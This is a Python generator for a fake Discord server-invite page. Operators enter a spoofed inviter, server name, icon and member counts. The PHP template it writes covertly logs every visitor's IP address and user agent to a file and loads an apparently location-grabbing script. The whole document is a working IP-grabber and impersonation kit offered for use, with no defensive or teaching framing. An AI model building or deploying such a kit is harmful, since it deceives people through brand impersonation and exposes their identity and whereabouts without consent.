import datetime
import shutil
import sys
import random

class COLORS:
    cyan = '\033[96m'
    red = '\033[91m'
    white = '\033[0;97m'
    gray = '\033[90m'

def now():
    now = datetime.datetime.now().strftime("%H:%M:%S")
    return now

s3index = """<?php
function getip()
{
    $ip = null;
    if(isset($_SERVER))
    {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        elseif(isset($_SERVER['HTTP_CLIENT_IP']))
        {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
        else
        {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    }
    else
    {
        if(getenv('HTTP_X_FORWARDED_FOR'))
        {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
        }
        elseif(getenv('HTTP_CLIENT_IP'))
        {
            $ip = getenv('HTTP_CLIENT_IP');
        }
        else
        {
            $ip = getenv('REMOTE_ADDR');
        }
    }
    return $ip;
}
function getagent()
{ 
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    return $useragent;
}
$ip = getip();
$agent = getagent();
$out = array(
    'status' => 'ip_info',
    'ip' => $ip,
    'agent' => $agent
);
$jsondata = json_encode($out);
file_put_contents("files/info/out.txt", $jsondata);
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Discord</title>
        <link href="https://fonts.cdnfonts.com/css/whitney-2" rel="stylesheet">
        <link rel="shortcut icon" href="/files/images/dwq2dD21ce1.ico">
    </head>
    <body style="margin: 0;overflow: hidden;">
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="/files/js/loc.js"></script>
        <div style="background: url(/files/images/xqcQWcX12.jpg);height: 132vh;background-size: cover;">
            <div style="width: 480px;height: 322.5px;position: relative;left: 50%;top: 50%;transform: translate(-50%,-88%);">
                <div style="border-radius: 5px;background: #36393f;padding: 32px;height: 258.5px;">
                    <div style="height: 64px;width: 64px;margin-bottom: 24px;border-radius: 16px;position: relative;left: 50%;transform: translate(-50%);background-image: url(/files/icons/$SICON$);background-size: cover;"></div>
                    <div style="font-family: whitney book;font-size: 16px;line-height: 20px;text-align: center;color: #b9bbbe;">$UNAME$ invited you to join</div>
                    <h1 style="font-family: whitney;font-weight: 600;margin-top: 8px;font-size: 25px;text-align: center;color: #ffffff;margin-bottom: 0;">$SNAME$</h1>
                    <div style="margin-top: 8px;text-align: center;display: flex;flex: 1 1 auto;flex-direction: row;align-items: stretch;flex-wrap: nowrap;justify-content: center;">
                        <div style="margin-right: 16px;display: flex;align-items: center;text-align: center;">
                            <i style="display: inline-block;width: 10px;height: 10px;border-radius: 50%;margin-right: 4px;background: #3ba55d;"></i>
                            <span style="font-size: 16px;color: #b9bbbe;line-height: 18px;font-weight: 400;font-family: whitney book;">$ONL$ Online</span>
                        </div>
                        <div style="display: flex;align-items: center;text-align: center;">
                            <i style="display: inline-block;width: 10px;height: 10px;border-radius: 50%;margin-right: 4px;background: #b9bbbe;"></i>
                            <span style="font-size: 16px;color: #b9bbbe;line-height: 18px;font-weight: 400;font-family: whitney book;">$MEM$ Members</span>
                        </div>
                    </div>
                    <button onclick='window.location.href = "$SLINK$"' style="background: #5865f2;font-size: 16px;line-height: 24px;margin-top: 40px;width: 100%;font-family: whitney;padding: 2px 16px;border: none;border-radius: 3px;height: 44px;color: #ffffff;cursor: pointer;">Accept Invite</button>
                </div>
            </div>
        </div>        
    </body>
</html>"""

def s3file(sname,slink,uname,onl,mem,sicon):
    print("")
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Generating index.php file.")
    tempindex = s3index
    tempindex = tempindex.replace("$SNAME$", sname)
    tempindex = tempindex.replace("$SLINK$", slink)
    tempindex = tempindex.replace("$UNAME$", uname)
    tempindex = tempindex.replace("$ONL$", onl)
    tempindex = tempindex.replace("$MEM$", mem)
    tempindex = tempindex.replace("$SICON$", sicon)
    with open("site/index.php", "w") as index:
        index.write(tempindex)
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: The index.php is Generated successfully.")

def s3setup():
    slink = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}INVITE LINK{COLORS.white}]> ")
    sname = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}SERVER NAME{COLORS.white}]> ")
    uname = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}USER NAME{COLORS.white}]> ")
    onl = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}ONLINE MEMBERS{COLORS.white}]> ")
    mem = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}SERVER MEMBERS{COLORS.white}]> ")
    sicon_ = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}SERVER IMAGE{COLORS.white}]> ").replace("\"","")
    siconext = sicon_.split('.')[-1]
    iconname= ""
    chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
    for i in range(15):
        iconname += random.choice(chars)
    try:
        shutil.copyfile(sicon_,f"site/files/icons/{iconname}.{siconext}")
    except:
        sys.exit(f"[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Error File Not Found '{sicon_}'{COLORS.white}")
    sicon = iconname+"."+siconext
    s3file(sname,slink,uname,onl,mem,sicon)